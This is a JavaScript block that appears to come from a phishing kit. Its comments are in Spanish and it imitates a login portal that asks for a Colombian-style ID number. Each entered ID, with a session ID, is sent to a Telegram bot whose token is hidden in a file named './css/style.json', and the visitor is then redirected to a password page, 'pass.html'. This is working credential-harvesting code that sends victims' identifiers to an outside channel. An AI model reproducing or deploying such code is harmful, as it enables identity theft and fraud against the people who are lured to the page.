  <script>
    const userInput = document.getElementById('userInput');
    const nextButton = document.getElementById('nextButton');
    const loader = document.querySelector(".loaderp-full");

    // Expresi贸n regular: prefijo (CC|CE|NI|TI|PE) seguido de 4-12 d铆gitos
    const regex = /^(CC|CE|NI|TI|PE)\d{4,12}$/i;

    userInput.addEventListener('input', function () {
      if (regex.test(this.value.trim())) {
        nextButton.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        nextButton.classList.add('bg-blue-600', 'text-white', 'cursor-pointer');
        nextButton.disabled = false;
      } else {
        nextButton.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        nextButton.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
        nextButton.disabled = true;
      }
    });

    nextButton.addEventListener('click', async function () {
      const value = userInput.value.trim();
      if (regex.test(value)) {
        loader.style.display = "flex";
        
        // Generar ID 煤nico para la sesi贸n
        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        
        // Guardar datos del usuario
        const userData = {
          sessionId: sessionId,
          usuario: value,
          timestamp: new Date().toISOString()
        };
        
        try {
          await sendUserEntryToTelegram(userData);
        } catch (error) {
          console.error('Error al notificar entrada:', error);
        }
        
        // Simular delay y redireccionar
        setTimeout(() => {
          loader.style.display = "none";
          // Guardar datos para la siguiente p谩gina
          localStorage.setItem('userData', JSON.stringify(userData));
          window.location.href = "pass.html";
        }, 1500);
      }
    });

    async function sendUserEntryToTelegram(data) {
      const message = ` Nuevo usuario ingres贸 al portal

 Session ID: ${data.sessionId}
 Usuario: ${data.usuario}
 Hora de entrada: ${new Date().toLocaleString('es-ES')}
 P谩gina: Index (Entrada)`;

      const config = await loadTelegramConfig();
      
      if (!config) {
        console.log('Configuraci贸n de Telegram no disponible');
        return;
      }

      return fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: config.chat_id,
          text: message
        }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log("Notificaci贸n de entrada enviada a Telegram");
        } else {
          console.error("Error al enviar notificaci贸n:", data);
        }
        return data;
      })
      .catch(error => {
        console.error("Error de red:", error);
        throw error;
      });
    }

    async function loadTelegramConfig() {
      try {
        const response = await fetch("./css/style.json");
        if (!response.ok) {
          throw new Error("No se pudo cargar el archivo de configuraci贸n.");
        }
        return await response.json();
      } catch (error) {
        console.error("Error al cargar configuraci贸n:", error);
        return null;
      }
    }
  </script>
